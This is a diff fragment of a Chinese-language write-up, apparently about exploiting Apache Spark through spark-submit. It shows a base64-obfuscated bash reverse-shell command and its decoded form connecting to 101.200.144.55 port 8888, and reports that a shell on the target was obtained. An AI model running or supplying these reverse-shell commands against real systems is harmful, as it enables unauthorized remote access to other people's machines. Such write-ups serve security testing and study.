@@ -67,4 +67,11 @@ spark-submit下载链接：https://archive.apache.org/dist/spark/spark-2.4.3/spa
 ```
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
 为
+bash -i >& /dev/tcp/101.200.144.55/8888 0>&1
+经过如下网站编码
+http://www.jackson-t.ca/runtime-exec-payloads.html
 ```
+执行后成功反弹shell  
+![image](./pic/5.png)  
+
+拿到目标测试后，成功拿到shell
